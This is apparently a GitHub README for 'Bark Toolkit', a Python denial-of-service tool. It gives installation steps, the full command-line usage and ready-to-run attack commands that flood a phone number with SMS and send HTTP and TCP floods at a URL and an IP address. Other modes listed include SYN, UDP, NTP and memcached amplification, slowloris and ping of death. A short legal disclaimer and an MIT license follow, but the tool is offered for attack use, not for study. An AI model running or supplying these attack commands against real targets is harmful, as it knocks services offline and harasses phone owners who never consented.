# Bark Toolkit

![Bark](https://raw.githubusercontent.com/Sloobot/Bark/main/.github/logo1.png)

<p align="center">
  <a href="https://wikipedia.org/wiki/Python_(programming_language)">
    <img src="https://img.shields.io/badge/language-python-blue.svg">
 </a>
  <a href="https://github.com/Sloobot/Bark/wiki">
      <img src="https://img.shields.io/badge/wiki%20-Bark-lightgrey.svg">
 </a>
</p>

***

# About Bark Toolkit

```
Bark Toolkit is a set of tools that provides denial 
of service attacks. Bark Toolkit includes SMS attack 
tool, HTTP attack tool and many other exciting attack tools.
```

***

# Getting started

## Bark installation

> cd Bark

> pip3 install -r requirements.txt

> chmod +x bark

> python3 bark.py

***

# Bark Toolkit execution

> Bark -h

```
usage: Bark [-h] [--target <IP:port/URL/phone>]
             [--tool [SMS|NTP|TCP|UDP|SYN|POD|SLOWLORIS|MEMCACHED|HTTP|NJRAT]]
             [--timeout <timeout>] [--threads <threads>] [-u] [--version]

optional arguments:
  -h, --help            show this help message and exit
  --target <IP:port/URL/phone>
                        Target IP:port, URL or phone.
  --tool [SMS|NTP|TCP|UDP|SYN|POD|SLOWLORIS|MEMCACHED|HTTP|NJRAT]
                        Attack tool.
  --timeout <timeout>   Timeout in secounds.
  --threads <threads>   Threads count.
  -u, --update          Update Bark Toolkit.
  --version             Show Bark Toolkit version.
```

***
  
# Bark Toolkit command examples

## Example of the SMS attack
    
> Bark --tool SMS --target 15554443333 --timeout 10 --threads 10
    
## Example of the HTTP attack

> Bark --tool HTTP --target http://<span></span>example.com/ --timeout 10 --threads 10
    
## Example of the TCP attack

> Bark --tool TCP --target 192.168.1.100:80 --timeout 10 --threads 10

***

# Bark Toolkit disclaimer

```
Usage of the Bark Toolkit for attacking targets without prior mutual consent is illegal.
It is the end user's responsibility to obey all applicable local, state, federal, and international laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program.
```

***

# Bark Toolkit license

```
MIT License

Copyright (c) 2021 Sloobot

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```
